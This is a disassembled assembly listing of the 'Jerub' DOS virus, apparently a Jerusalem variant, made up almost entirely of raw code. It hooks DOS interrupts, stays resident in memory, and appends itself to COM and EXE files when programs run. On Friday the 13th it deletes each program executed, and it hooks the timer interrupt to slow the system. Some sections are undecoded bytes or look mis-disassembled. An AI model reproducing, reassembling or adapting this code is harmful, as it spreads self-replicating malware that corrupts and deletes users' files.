﻿

  
PAGE  59,132
  
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
;ÛÛ								         ÛÛ
;ÛÛ			        JERUB				         ÛÛ
;ÛÛ								         ÛÛ
;ÛÛ      Created:   22-Mar-90					         ÛÛ
;ÛÛ      Passes:    5	       Analysis Flags on: H		         ÛÛ
;ÛÛ								         ÛÛ
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
  
data_1e		equ	2Ch			; (0000:002C=39Fh)
data_2e		equ	2F2h			; (139F:02F2=2020h)
data_3e		equ	100Fh			; (139F:100F=0)
data_4e		equ	1013h			; (139F:1013=64h)
data_5e		equ	1017h			; (139F:1017=64h)
data_6e		equ	101Bh			; (139F:101B=6Ch)
data_7e		equ	101Fh			; (139F:101F=0FFh)
data_8e		equ	1023h			; (139F:1023=70h)
data_9e		equ	1027h			; (139F:1027=70h)
data_10e	equ	102Bh			; (139F:102B=0Eh)
data_11e	equ	102Fh			; (139F:102F=9Fh)
data_12e	equ	1033h			; (139F:1033=0FFh)
data_13e	equ	0B600h			; (139F:B600=0D0h)
data_14e	equ	0F900h			; (139F:F900=7Ah)
data_15e	equ	43h			; (3E00:0043=0FFFFh)
data_16e	equ	45h			; (3E00:0045=0FFFFh)
data_17e	equ	47h			; (3E00:0047=0FFFFh)
data_18e	equ	49h			; (3E00:0049=0FFFFh)
data_19e	equ	51h			; (3E00:0051=0FFFFh)
data_20e	equ	53h			; (3E00:0053=0FFFFh)
data_21e	equ	57h			; (3E00:0057=0FFFFh)
data_22e	equ	5Dh			; (3E00:005D=0FFFFh)
data_23e	equ	5Fh			; (3E00:005F=0FFFFh)
data_24e	equ	61h			; (3E00:0061=0FFFFh)
data_25e	equ	63h			; (3E00:0063=0FFFFh)
data_26e	equ	65h			; (3E00:0065=0FFFFh)
data_27e	equ	78h			; (3E00:0078=0FFFFh)
data_28e	equ	7Ah			; (3E00:007A=0FFFFh)
data_29e	equ	7Ch			; (3E00:007C=0FFFFh)
data_30e	equ	7Eh			; (3E00:007E=0FFFFh)
data_31e	equ	0Ah			; (6C64:000A=0)
data_32e	equ	0Ch			; (6C64:000C=0)
data_33e	equ	0Eh			; (6C64:000E=0)
data_34e	equ	0Fh			; (6C64:000F=0)
data_35e	equ	11h			; (6C64:0011=0)
data_36e	equ	13h			; (6C64:0013=0)
data_37e	equ	15h			; (6C64:0015=0)
data_38e	equ	17h			; (6C64:0017=0)
data_39e	equ	19h			; (6C64:0019=0)
data_40e	equ	1Bh			; (6C64:001B=0)
data_41e	equ	1Dh			; (6C64:001D=0)
data_42e	equ	1Fh			; (6C64:001F=0)
data_43e	equ	29h			; (6C64:0029=0)
data_44e	equ	2Bh			; (6C64:002B=0)
data_45e	equ	2Dh			; (6C64:002D=0)
data_46e	equ	2Fh			; (6C64:002F=0)
data_47e	equ	31h			; (6C64:0031=0)
data_48e	equ	33h			; (6C64:0033=0)
data_49e	equ	4Eh			; (6C64:004E=0)
data_50e	equ	70h			; (6C64:0070=0)
data_51e	equ	72h			; (6C64:0072=0)
data_52e	equ	74h			; (6C64:0074=0)
data_53e	equ	76h			; (6C64:0076=0)
data_54e	equ	7Ah			; (6C64:007A=0)
data_55e	equ	80h			; (6C64:0080=0)
data_56e	equ	82h			; (6C64:0082=0)
data_57e	equ	8Fh			; (6C64:008F=0)
data_65e	equ	100Fh			; (6C64:100F=0)
data_66e	equ	0B600h			; (6C64:B600=0)
data_67e	equ	0F900h			; (6C64:F900=0)
  
seg_a		segment
		assume	cs:seg_a, ds:seg_a
  
  
		org	100h
  
jerub		proc	far
  
start:
		jmp	loc_11			; (0195)
		db	73h, 55h, 4Dh, 73h, 44h, 6Fh
		db	73h, 0, 1, 57h, 11h, 0
		db	0, 0, 6, 0, 2Ch, 2
		db	70h, 0, 8Dh, 13h, 8Ch, 2
		db	0EBh, 4, 10h
		db	0Ah, 49h, 7Ah
loc_9:
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	al,ch
		push	es
		db	26h			; es:
		stc				; Set carry flag
		or	al,[bx+si+0]
		nop				;*Fixup for MASM (M)
		add	ds:data_67e[bx+si],al	; (6C64:F900=0)
		or	bl,[si+0]
		stc				; Set carry flag
		or	ch,[si+0]
		stc				; Set carry flag
		or	al,ds:data_66e[bx+si]	; (6C64:B600=0)
		sbb	al,[bp+si]
		add	[bx+di],cl
		or	ax,data_59		; (6C64:02F2=1EBAh)
		add	[di+5Ah],cl
;*		loopnz	locloop_10		;*Loop if zf=0, cx>0
  
		db	0E0h, 1
		add	byte ptr [bx+si],2
		add	[bx+si],ah
		add	[bx+di],cl
		add	bh,bh
		jmp	dword ptr ds:data_65e[di]	;*(6C64:100F=0)      1 entry
		db	7, 84h, 19h, 0C5h, 0, 0ADh
		db	0Fh, 20h, 0, 0, 0, 4Ch
		db	0B0h, 0, 0CDh, 21h, 5, 0
		db	20h, 0, 76h, 14h, 0D0h, 3
		db	0, 2, 10h, 0, 0D0h, 0FCh
		db	0, 0, 0DBh, 3Eh, 58h, 9Bh
		db	'COMMAND.COM'
		db	1, 0, 0, 0, 0, 0
loc_11:
		cld				; Clear direction
		mov	ah,0E0h
		int	21h			; DOS Services  ah=function E0h
		cmp	ah,0E0h
		jae	loc_12			; Jump if above or =
		cmp	ah,3
		jb	loc_12			; Jump if below
		mov	ah,0DDh
		mov	di,100h
		mov	si,710h
		add	si,di
		mov	cx,cs:[di+11h]
		nop				;*Fixup for MASM (M)
		int	21h			; DOS Services  ah=function DDh
loc_12:
		mov	ax,cs
		add	ax,10h
		mov	ss,ax
		mov	sp,700h
		push	ax
		mov	ax,0C5h
		push	ax
		retf				; Return far
		db	0FCh, 6, 2Eh, 8Ch, 6, 31h
		db	0, 2Eh, 8Ch, 6, 39h, 0
		db	2Eh, 8Ch, 6, 3Dh, 0, 2Eh
		db	8Ch, 6, 41h, 0, 8Ch, 0C0h
		db	5, 10h, 0, 2Eh, 1, 6
		db	49h, 0, 2Eh, 1, 6, 45h
		db	0, 0B4h, 0E0h, 0CDh, 21h, 80h
		db	0FCh, 0E0h, 73h, 13h, 80h, 0FCh
		db	3, 7, 2Eh, 8Eh, 16h, 45h
		db	0, 2Eh, 8Bh, 26h, 43h, 0
		db	2Eh, 0FFh, 2Eh, 47h, 0, 33h
		db	0C0h, 8Eh, 0C0h, 26h, 0A1h, 0FCh
		db	3, 2Eh, 0A3h, 4Bh, 0, 26h
		db	0A0h, 0FEh, 3, 2Eh, 0A2h, 4Dh
		db	0
		db	26h
  
jerub		endp
  
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
;
;			External Entry Point
;
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
  
int_24h_entry	proc	far
		mov	word ptr ds:[3FCh],0A5F3h	; (6C64:03FC=29h)
		mov	byte ptr es:data_61,0CBh	; (6C64:03FE=2Eh)
		pop	ax
		add	ax,10h
		mov	es,ax
		push	cs
		pop	ds
		mov	cx,710h
		shr	cx,1			; Shift w/zeros fill
		xor	si,si			; Zero register
		mov	di,si
		push	es
		mov	ax,142h
		push	ax
;*		jmp	far ptr loc_2		;*(0000:03FC)
		db	0EAh, 0FCh, 3, 0, 0
		db	8Ch, 0C8h, 8Eh, 0D0h, 0BCh, 0
		db	7, 33h, 0C0h, 8Eh, 0D8h, 2Eh
		db	0A1h, 4Bh, 0, 0A3h, 0FCh, 3
		db	2Eh, 0A0h, 4Dh, 0, 0A2h, 0FEh
		db	3
int_24h_entry	endp
  
  
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
;
;			External Entry Point
;
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
  
int_21h_entry	proc	far
		mov	bx,sp
		mov	cl,4
		shr	bx,cl			; Shift w/zeros fill
		add	bx,10h
		mov	cs:data_48e,bx		; (6C64:0033=0)
		mov	ah,4Ah			; 'J'
		mov	es,cs:data_47e		; (6C64:0031=0)
		int	21h			; DOS Services  ah=function 4Ah
						;  change mem allocation, bx=siz
		mov	ax,3521h
		int	21h			; DOS Services  ah=function 35h
						;  get intrpt vector al in es:bx
		mov	cs:data_38e,bx		; (6C64:0017=0)
		mov	cs:data_39e,es		; (6C64:0019=0)
		push	cs
		pop	ds
		mov	dx,25Bh
		mov	ax,2521h
		int	21h			; DOS Services  ah=function 25h
						;  set intrpt vector al to ds:dx
		mov	es,ds:data_47e		; (6C64:0031=0)
		mov	es,es:data_1e		; (0000:002C=39Fh)
		xor	di,di			; Zero register
		mov	cx,7FFFh
		xor	al,al			; Zero register
  
locloop_13:
		repne	scasb			; Rept zf=0+cx>0 Scan es:[di] for al
		cmp	es:[di],al
		loopnz	locloop_13		; Loop if zf=0, cx>0
  
		mov	dx,di
		add	dx,3
		mov	ax,4B00h
		push	es
		pop	ds
		push	cs
		pop	es
		mov	bx,35h
		push	ds
		push	es
		push	ax
		push	bx
		push	cx
		push	dx
		mov	ah,2Ah			; '*'
		int	21h			; DOS Services  ah=function 2Ah
						;  get date, cx=year, dx=mon/day
		mov	byte ptr cs:data_33e,0	; (6C64:000E=0)
		cmp	cx,7C3h
		je	loc_15			; Jump if equal
		cmp	al,5
		jne	loc_14			; Jump if not equal
		cmp	dl,0Dh
		jne	loc_14			; Jump if not equal
		inc	byte ptr cs:data_33e	; (6C64:000E=0)
		jmp	short loc_15		; (02F7)
		db	90h
loc_14:
		mov	ax,3508h
		int	21h			; DOS Services  ah=function 35h
						;  get intrpt vector al in es:bx
		mov	cs:data_36e,bx		; (6C64:0013=0)
		mov	cs:data_37e,es		; (6C64:0015=0)
		push	cs
		pop	ds
		mov	word ptr ds:data_42e,7E90h	; (6C64:001F=0)
		mov	ax,2508h
data_59		dw	1EBAh
		db	2, 0CDh, 21h
loc_15:
		pop	dx
		pop	cx
		pop	bx
		pop	ax
		pop	es
		pop	ds
		pushf				; Push flags
		call	dword ptr cs:data_38e	; (6C64:0017=0)
		push	ds
		pop	es
		mov	ah,49h			; 'I'
		int	21h			; DOS Services  ah=function 49h
						;  release memory block, es=seg
		mov	ah,4Dh			; 'M'
		int	21h			; DOS Services  ah=function 4Dh
						;  get return code info in ax
		mov	ah,31h			; '1'
		mov	dx,600h
		mov	cl,4
		shr	dx,cl			; Shift w/zeros fill
		add	dx,10h
		int	21h			; DOS Services  ah=function 31h
						;  terminate & stay resident
		db	32h, 0C0h, 0CFh, 2Eh, 83h, 3Eh
		db	1Fh, 0, 2, 75h, 17h, 50h
		db	53h, 51h, 52h, 55h, 0B8h, 2
		db	6, 0B7h, 87h, 0B9h, 5, 5
		db	0BAh, 10h, 10h, 0CDh, 10h, 5Dh
		db	5Ah, 59h, 5Bh, 58h, 2Eh, 0FFh
		db	0Eh, 1Fh, 0, 75h, 12h, 2Eh
		db	0C7h, 6, 1Fh, 0, 1, 0
		db	50h, 51h, 56h, 0B9h, 1, 40h
		db	0F3h, 0ACh
		db	5Eh, 59h, 58h
loc_16:
		jmp	dword ptr cs:data_36e	; (6C64:0013=0)
		db	9Ch, 80h, 0FCh, 0E0h, 75h, 5
		db	0B8h, 0, 3, 9Dh, 0CFh, 80h
		db	0FCh, 0DDh, 74h, 13h, 80h, 0FCh
		db	0DEh, 74h, 28h, 3Dh, 0, 4Bh
		db	75h, 3, 0E9h, 0B4h, 0
loc_17:
		popf				; Pop flags
		jmp	dword ptr cs:data_38e	; (6C64:0017=0)
loc_18:
		pop	ax
		pop	ax
		mov	ax,100h
		mov	cs:data_31e,ax		; (6C64:000A=0)
		pop	ax
		mov	cs:data_32e,ax		; (6C64:000C=0)
		rep	movsb			; Rep while cx>0 Mov [si] to es:[di]
		popf				; Pop flags
		mov	ax,cs:data_34e		; (6C64:000F=0)
		jmp	dword ptr cs:data_31e	; (6C64:000A=0)
loc_19:
		add	sp,6
		popf				; Pop flags
		mov	ax,cs
		mov	ss,ax
		mov	sp,710h
		push	es
		push	es
		xor	di,di			; Zero register
		push	cs
		pop	es
		mov	cx,10h
		mov	si,bx
		mov	di,21h
		rep	movsb			; Rep while cx>0 Mov [si] to es:[di]
		mov	ax,ds
		mov	es,ax
		mul	word ptr cs:data_54e	; (6C64:007A=0) ax = data * ax
		add	ax,cs:data_44e		; (6C64:002B=0)
		adc	dx,0
		div	word ptr cs:data_54e	; (6C64:007A=0) ax,dxrem=dx:ax/data
		mov	ds,ax
		mov	si,dx
		mov	di,dx
		mov	bp,es
		mov	bx,cs:data_46e		; (6C64:002F=0)
		or	bx,bx			; Zero ?
		jz	loc_21			; Jump if zero
loc_20:
		mov	cx,8000h
		rep	movsw			; Rep while cx>0 Mov [si] to es:[di]
		add	ax,1000h
		add	bp,1000h
		mov	ds,ax
		mov	es,bp
		dec	bx
		jnz	loc_20			; Jump if not zero
loc_21:
		mov	cx,cs:data_45e		; (6C64:002D=0)
		rep	movsb			; Rep while cx>0 Mov [si] to es:[di]
		pop	ax
		push	ax
		add	ax,10h
		add	cs:data_43e,ax		; (6C64:0029=0)
data_61		db	2Eh
		db	1, 6, 25h, 0, 2Eh, 0A1h
		db	21h, 0, 1Fh, 7, 2Eh, 8Eh
		db	16h, 29h, 0, 2Eh, 8Bh, 26h
		db	27h, 0, 2Eh, 0FFh, 2Eh, 23h
		db	0
loc_22:
		xor	cx,cx			; Zero register
		mov	ax,4301h
		int	21h			; DOS Services  ah=function 43h
						;  get/set file attrb, nam@ds:dx
		mov	ah,41h			; 'A'
		int	21h			; DOS Services  ah=function 41h
						;  delete file, name @ ds:dx
		mov	ax,4B00h
		popf				; Pop flags
		jmp	dword ptr cs:data_38e	; (6C64:0017=0)
loc_23:
		cmp	byte ptr cs:data_33e,1	; (6C64:000E=0)
		je	loc_22			; Jump if equal
		mov	word ptr cs:data_50e,0FFFFh	; (6C64:0070=0)
		mov	word ptr cs:data_57e,0	; (6C64:008F=0)
		mov	cs:data_55e,dx		; (6C64:0080=0)
		mov	cs:data_56e,ds		; (6C64:0082=0)
		push	ax
		push	bx
		push	cx
		push	dx
		push	si
		push	di
		push	ds
		push	es
		cld				; Clear direction
		mov	di,dx
		xor	dl,dl			; Zero register
		cmp	byte ptr [di+1],3Ah	; ':'
		jne	loc_24			; Jump if not equal
		mov	dl,[di]
		and	dl,1Fh
loc_24:
		mov	ah,36h			; '6'
		int	21h			; DOS Services  ah=function 36h
						;  get free space, drive dl,1=a:
		cmp	ax,0FFFFh
		jne	loc_26			; Jump if not equal
loc_25:
		jmp	loc_52			; (06E7)
loc_26:
		mul	bx			; dx:ax = reg * ax
		mul	cx			; dx:ax = reg * ax
		or	dx,dx			; Zero ?
		jnz	loc_27			; Jump if not zero
		cmp	ax,710h
		jb	loc_25			; Jump if below
loc_27:
		mov	dx,cs:data_55e		; (6C64:0080=0)
		push	ds
		pop	es
		xor	al,al			; Zero register
		mov	cx,41h
		repne	scasb			; Rept zf=0+cx>0 Scan es:[di] for al
		mov	si,cs:data_55e		; (6C64:0080=0)
loc_28:
		mov	al,[si]
		or	al,al			; Zero ?
		jz	loc_30			; Jump if zero
		cmp	al,61h			; 'a'
		jb	loc_29			; Jump if below
		cmp	al,7Ah			; 'z'
		ja	loc_29			; Jump if above
		sub	byte ptr [si],20h	; ' '
loc_29:
		inc	si
		jmp	short loc_28		; (0490)
loc_30:
		mov	cx,0Bh
		sub	si,cx
		mov	di,84h
		push	cs
		pop	es
		mov	cx,0Bh
		repe	cmpsb			; Rept zf=1+cx>0 Cmp [si] to es:[di]
		jnz	loc_31			; Jump if not zero
		jmp	loc_52			; (06E7)
loc_31:
		mov	ax,4300h
		int	21h			; DOS Services  ah=function 43h
						;  get/set file attrb, nam@ds:dx
		jc	loc_32			; Jump if carry Set
		mov	cs:data_51e,cx		; (6C64:0072=0)
loc_32:
		jc	loc_34			; Jump if carry Set
		xor	al,al			; Zero register
		mov	cs:data_49e,al		; (6C64:004E=0)
		push	ds
		pop	es
		mov	di,dx
		mov	cx,41h
		repne	scasb			; Rept zf=0+cx>0 Scan es:[di] for al
		cmp	byte ptr [di-2],4Dh	; 'M'
		je	loc_33			; Jump if equal
		cmp	byte ptr [di-2],6Dh	; 'm'
		je	loc_33			; Jump if equal
		inc	byte ptr cs:data_49e	; (6C64:004E=0)
loc_33:
		mov	ax,3D00h
		int	21h			; DOS Services  ah=function 3Dh
						;  open file, al=mode,name@ds:dx
loc_34:
		jc	loc_36			; Jump if carry Set
		mov	cs:data_50e,ax		; (6C64:0070=0)
		mov	bx,ax
		mov	ax,4202h
		mov	cx,0FFFFh
		mov	dx,0FFFBh
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, cx,dx=offset
		jc	loc_34			; Jump if carry Set
		add	ax,5
		mov	cs:data_35e,ax		; (6C64:0011=0)
		mov	cx,5
		mov	dx,6Bh
		mov	ax,cs
		mov	ds,ax
		mov	es,ax
		mov	ah,3Fh			; '?'
		int	21h			; DOS Services  ah=function 3Fh
						;  read file, cx=bytes, to ds:dx
		mov	di,dx
		mov	si,5
		repe	cmpsb			; Rept zf=1+cx>0 Cmp [si] to es:[di]
		jnz	loc_35			; Jump if not zero
		mov	ah,3Eh			; '>'
		int	21h			; DOS Services  ah=function 3Eh
						;  close file, bx=file handle
		jmp	loc_52			; (06E7)
loc_35:
		mov	ax,3524h
		int	21h			; DOS Services  ah=function 35h
						;  get intrpt vector al in es:bx
		mov	ds:data_40e,bx		; (6C64:001B=0)
		mov	ds:data_41e,es		; (6C64:001D=0)
		mov	dx,21Bh
		mov	ax,2524h
		int	21h			; DOS Services  ah=function 25h
						;  set intrpt vector al to ds:dx
		lds	dx,dword ptr ds:data_55e	; (6C64:0080=0) Load 32 bit ptr
		xor	cx,cx			; Zero register
		mov	ax,4301h
		int	21h			; DOS Services  ah=function 43h
						;  get/set file attrb, nam@ds:dx
loc_36:
		jc	loc_37			; Jump if carry Set
		mov	bx,cs:data_50e		; (6C64:0070=0)
		mov	ah,3Eh			; '>'
		int	21h			; DOS Services  ah=function 3Eh
						;  close file, bx=file handle
		mov	word ptr cs:data_50e,0FFFFh	; (6C64:0070=0)
		mov	ax,3D02h
		int	21h			; DOS Services  ah=function 3Dh
						;  open file, al=mode,name@ds:dx
		jc	loc_37			; Jump if carry Set
		mov	cs:data_50e,ax		; (6C64:0070=0)
		mov	ax,cs
		mov	ds,ax
		mov	es,ax
		mov	bx,ds:data_50e		; (6C64:0070=0)
		mov	ax,5700h
		int	21h			; DOS Services  ah=function 57h
						;  get/set file date & time
		mov	ds:data_52e,dx		; (6C64:0074=0)
		mov	ds:data_53e,cx		; (6C64:0076=0)
		mov	ax,4200h
		xor	cx,cx			; Zero register
		mov	dx,cx
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, cx,dx=offset
loc_37:
		jc	loc_40			; Jump if carry Set
		cmp	byte ptr ds:data_49e,0	; (6C64:004E=0)
		je	loc_38			; Jump if equal
		jmp	short loc_42		; (05E6)
		db	90h
loc_38:
		mov	bx,1000h
		mov	ah,48h			; 'H'
		int	21h			; DOS Services  ah=function 48h
						;  allocate memory, bx=bytes/16
		jnc	loc_39			; Jump if carry=0
		mov	ah,3Eh			; '>'
		mov	bx,ds:data_50e		; (6C64:0070=0)
		int	21h			; DOS Services  ah=function 3Eh
						;  close file, bx=file handle
		jmp	loc_52			; (06E7)
loc_39:
		inc	word ptr ds:data_57e	; (6C64:008F=0)
		mov	es,ax
		xor	si,si			; Zero register
		mov	di,si
		mov	cx,710h
		rep	movsb			; Rep while cx>0 Mov [si] to es:[di]
		mov	dx,di
		mov	cx,ds:data_35e		; (6C64:0011=0)
		mov	bx,ds:data_50e		; (6C64:0070=0)
		push	es
		pop	ds
		mov	ah,3Fh			; '?'
		int	21h			; DOS Services  ah=function 3Fh
						;  read file, cx=bytes, to ds:dx
loc_40:
		jc	loc_41			; Jump if carry Set
		add	di,cx
		xor	cx,cx			; Zero register
		mov	dx,cx
		mov	ax,4200h
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, cx,dx=offset
		mov	si,5
		mov	cx,5
		rep	movs  byte ptr es:[di],cs:[si]	; Rep while cx>0 Mov [si] to es:[di]
		mov	cx,di
		xor	dx,dx			; Zero register
		mov	ah,40h			; '@'
		int	21h			; DOS Services  ah=function 40h
						;  write file cx=bytes, to ds:dx
loc_41:
		jc	loc_43			; Jump if carry Set
		jmp	loc_50			; (06A2)
loc_42:
		mov	cx,1Ch
		mov	dx,4Fh
		mov	ah,3Fh			; '?'
		int	21h			; DOS Services  ah=function 3Fh
						;  read file, cx=bytes, to ds:dx
loc_43:
		jc	loc_45			; Jump if carry Set
		mov	word ptr ds:data_24e,1984h	; (3E00:0061=0FFFFh)
		mov	ax,ds:data_22e		; (3E00:005D=0FFFFh)
		mov	ds:data_16e,ax		; (3E00:0045=0FFFFh)
		mov	ax,ds:data_23e		; (3E00:005F=0FFFFh)
		mov	ds:data_15e,ax		; (3E00:0043=0FFFFh)
		mov	ax,ds:data_25e		; (3E00:0063=0FFFFh)
		mov	ds:data_17e,ax		; (3E00:0047=0FFFFh)
		mov	ax,ds:data_26e		; (3E00:0065=0FFFFh)
		mov	ds:data_18e,ax		; (3E00:0049=0FFFFh)
		mov	ax,ds:data_20e		; (3E00:0053=0FFFFh)
		cmp	word ptr ds:data_19e,0	; (3E00:0051=0FFFFh)
		je	loc_44			; Jump if equal
		dec	ax
loc_44:
		mul	word ptr ds:data_27e	; (3E00:0078=0FFFFh) ax = data * ax
		add	ax,ds:data_19e		; (3E00:0051=0FFFFh)
		adc	dx,0
		add	ax,0Fh
		adc	dx,0
		and	ax,0FFF0h
		mov	ds:data_29e,ax		; (3E00:007C=0FFFFh)
		mov	ds:data_30e,dx		; (3E00:007E=0FFFFh)
		add	ax,710h
		adc	dx,0
loc_45:
		jc	loc_47			; Jump if carry Set
		div	word ptr ds:data_27e	; (3E00:0078=0FFFFh) ax,dxrem=dx:ax/da
		or	dx,dx			; Zero ?
		jz	loc_46			; Jump if zero
		inc	ax
loc_46:
		mov	ds:data_20e,ax		; (3E00:0053=0FFFFh)
		mov	ds:data_19e,dx		; (3E00:0051=0FFFFh)
		mov	ax,ds:data_29e		; (3E00:007C=0FFFFh)
		mov	dx,ds:data_30e		; (3E00:007E=0FFFFh)
		div	word ptr ds:data_28e	; (3E00:007A=0FFFFh) ax,dxrem=dx:ax/da
		sub	ax,ds:data_21e		; (3E00:0057=0FFFFh)
		mov	ds:data_26e,ax		; (3E00:0065=0FFFFh)
		mov	word ptr ds:data_25e,0C5h	; (3E00:0063=0FFFFh)
		mov	ds:data_22e,ax		; (3E00:005D=0FFFFh)
		mov	word ptr ds:data_23e,710h	; (3E00:005F=0FFFFh)
		xor	cx,cx			; Zero register
		mov	dx,cx
		mov	ax,4200h
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, cx,dx=offset
loc_47:
		jc	loc_48			; Jump if carry Set
		mov	cx,1Ch
		mov	dx,4Fh
		mov	ah,40h			; '@'
		int	21h			; DOS Services  ah=function 40h
						;  write file cx=bytes, to ds:dx
loc_48:
		jc	loc_49			; Jump if carry Set
		cmp	ax,cx
		jne	loc_50			; Jump if not equal
		mov	dx,ds:data_29e		; (3E00:007C=0FFFFh)
		mov	cx,ds:data_30e		; (3E00:007E=0FFFFh)
		mov	ax,4200h
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, cx,dx=offset
loc_49:
		jc	loc_50			; Jump if carry Set
		xor	dx,dx			; Zero register
		mov	cx,710h
		mov	ah,40h			; '@'
		int	21h			; DOS Services  ah=function 40h
						;  write file cx=bytes, to ds:dx
loc_50:
		cmp	word ptr cs:data_57e,0	; (6C64:008F=0)
		je	loc_51			; Jump if equal
		mov	ah,49h			; 'I'
		int	21h			; DOS Services  ah=function 49h
						;  release memory block, es=seg
loc_51:
		cmp	word ptr cs:data_50e,0FFFFh	; (6C64:0070=0)
		je	loc_52			; Jump if equal
		mov	bx,cs:data_50e		; (6C64:0070=0)
		mov	dx,cs:data_52e		; (6C64:0074=0)
		mov	cx,cs:data_53e		; (6C64:0076=0)
		mov	ax,5701h
		int	21h			; DOS Services  ah=function 57h
						;  get/set file date & time
		mov	ah,3Eh			; '>'
		int	21h			; DOS Services  ah=function 3Eh
						;  close file, bx=file handle
		lds	dx,dword ptr cs:data_55e	; (6C64:0080=0) Load 32 bit ptr
		mov	cx,cs:data_51e		; (6C64:0072=0)
		mov	ax,4301h
		int	21h			; DOS Services  ah=function 43h
						;  get/set file attrb, nam@ds:dx
		lds	dx,dword ptr cs:data_40e	; (6C64:001B=0) Load 32 bit ptr
		mov	ax,2524h
		int	21h			; DOS Services  ah=function 25h
						;  set intrpt vector al to ds:dx
loc_52:
		pop	es
		pop	ds
		pop	di
		pop	si
		pop	dx
		pop	cx
		pop	bx
		pop	ax
		popf				; Pop flags
		jmp	dword ptr cs:data_38e	; (6C64:0017=0)
		db	11 dup (0)
		db	4Dh, 10h, 0Ah, 0, 10h
		db	11 dup (0)
		db	0E9h, 92h, 0, 73h, 55h, 4Dh
		db	73h, 44h, 6Fh, 73h, 0, 1
		db	57h, 11h, 0, 0, 0, 6
		db	0, 2Ch, 2, 70h, 0, 8Dh
		db	13h, 8Ch, 2, 0EBh, 4, 10h
		db	0Ah, 49h, 7Ah
loc_53:
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	al,ch
		push	es
		db	26h			; es:
		stc				; Set carry flag
		or	al,[bx+si+0]
		nop				;*Fixup for MASM (M)
		add	ds:data_14e[bx+si],al	; (139F:F900=7Ah)
		or	bl,[si+0]
		stc				; Set carry flag
		or	ch,[si+0]
		stc				; Set carry flag
		or	al,ds:data_13e[bx+si]	; (139F:B600=0D0h)
		sbb	al,[bp+si]
		add	[bx+di],cl
		or	ax,ds:data_2e		; (139F:02F2=2020h)
		add	[di+5Ah],cl
;*		loopnz	locloop_54		;*Loop if zf=0, cx>0
  
		db	0E0h, 1
		add	byte ptr [bx+si],2
		add	[bx+si],ah
		add	[bx+di],cl
		add	bh,bh
		jmp	dword ptr ds:data_3e[di]	;*(139F:100F=0)      9 entries
		db	7, 84h, 19h, 0C5h, 0, 0ADh
		db	0Fh, 20h, 0, 0, 0, 4Ch
		db	0B0h, 0, 0CDh, 21h, 5, 0
		db	20h, 0, 76h, 14h, 0D0h, 3
		db	0, 2, 10h, 0, 0D0h, 0FCh
		db	0, 0, 0DBh, 3Eh, 58h, 9Bh
		db	'COMMAND.COM'
		db	1, 0, 0, 0, 0, 0
		db	0FCh, 0B4h, 0E0h, 0CDh, 21h, 80h
		db	0FCh, 0E0h, 73h, 16h, 80h, 0FCh
		db	3, 72h, 11h, 0B4h, 0DDh, 0BFh
		db	0, 1, 0BEh, 10h, 7, 3
		db	0F7h, 2Eh, 8Bh, 8Dh, 11h, 0
		db	0CDh
		db	21h
loc_55:
		mov	ax,cs
		add	ax,10h
		mov	ss,ax
		mov	sp,700h
		push	ax
		mov	ax,0C5h
		push	ax
		retf				; Return far
int_21h_entry	endp
  
		db	0FCh, 6, 2Eh, 8Ch, 6, 31h
		db	0, 2Eh, 8Ch, 6, 39h, 0
		db	2Eh, 8Ch, 6, 3Dh, 0, 2Eh
		db	8Ch, 6, 41h, 0, 8Ch, 0C0h
		db	5, 10h, 0, 2Eh, 1, 6
		db	49h, 0, 2Eh, 1, 6, 45h
		db	0, 0B4h, 0E0h, 0CDh, 21h, 80h
		db	0FCh, 0E0h, 73h, 13h, 80h, 0FCh
		db	3, 7, 2Eh, 8Eh, 16h, 45h
		db	0, 2Eh, 8Bh, 26h, 43h, 0B4h
		db	4Ch, 0B0h, 0, 0CDh
		db	21h, 4Dh, 73h, 44h, 6Fh, 73h
  
seg_a		ends
  
  
  
		end	start

